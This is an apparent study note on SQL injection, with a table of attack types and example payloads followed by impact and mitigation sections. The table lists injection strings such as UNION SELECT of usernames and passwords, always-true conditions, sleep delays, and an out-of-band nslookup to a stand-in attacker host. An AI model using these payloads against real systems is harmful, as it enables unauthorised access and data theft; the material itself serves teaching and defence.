### SQL Injection and Its Types


| **Type**                       | **Sub-Type**                  | **Description**                                                                                      | **Example Commands**                                  |
|-------------------------------|-------------------------------|------------------------------------------------------------------------------------------------------|-----------------------------------------------------|
| **In-band SQL Injection**      |                               | Uses the same communication channel for both launching the attack and retrieving results              |                                                     |
|                                | a) **Union-based SQLi**       | Utilizes the SQL UNION operator to combine the results of multiple SELECT queries into a single result set | `1 UNION SELECT username, password FROM users, ' UNION SELECT null, null--, ' UNION SELECT null, null, null--, ' UNION SELECT null, null, null, null--` |
|                                | b) **Error-based SQLi**       | Injects SQL code that triggers database errors, potentially revealing information about the database schema or contents | `AND 1=1--, SELECT 1/0--, AND 1=0--, AND 1=1#, OR 1=1, OR x=x` |
| **Blind SQL Injection**        |                               | The attacker does not see the result of the query directly but infers information from the application's responses |                                                     |
|                                | a) **Boolean-based Blind SQLi** | Sends SQL queries that result in true or false responses to infer data based on the application's behavior | `' OR '1'='1, ' OR 1=1--, " OR "" = ", " OR 1 = 1--, ' OR '' = ', ' OR 1=1 AND 'a'='a` |
|                                | b) **Time-based Blind SQLi**  | Introduces delays in SQL queries to infer data based on the application's response time              | `SLEEP(5)--, " OR SLEEP(5)--, ' OR SLEEP(5)--, WAITFOR DELAY '00:00:10'--` |
| **Out-of-band SQL Injection**  |                               | Uses alternative communication channels (such as DNS or HTTP) to exfiltrate data                      | `http://example.com/somepage.php?id=1; nslookup attacker.com` |
| **Second-order SQL Injection** |                               | The malicious payload is stored within the application's database and executed later when certain conditions are met | `INSERT INTO users (username, password) VALUES ('test', 'test'); -- The stored payload executes later when the application processes the data` |



##  Impact of SQL Injection

The impact of a successful SQL Injection attack can be severe, affecting the integrity, confidentiality, and availability of data. Some of the most critical consequences include:

- Unauthorized access to sensitive information such as usernames, passwords, and credit card details.
- Data theft and unauthorized modification of database records.
- Loss of data integrity, leading to corrupted data.
- System downtime, affecting service availability.
- Financial losses and damage to organizational reputation.

##  Mitigation Measures

To prevent SQL Injection attacks, it is essential to implement strong security practices, including:

- **Input validation and sanitization:** Ensure that all user inputs are properly validated and sanitized to prevent malicious characters.
- **Use of prepared statements:** Prepared statements with parameterized queries prevent SQLi by separating data from code.
- **Database privilege management:** Restrict database access rights and ensure least privilege is applied to reduce the impact of a compromise.
- **Regular security audits and penetration testing:** Regularly scan and test applications for SQL injection vulnerabilities.
- **Use of Web Application Firewalls (WAFs):** A WAF can help detect and block malicious SQL injection attempts.
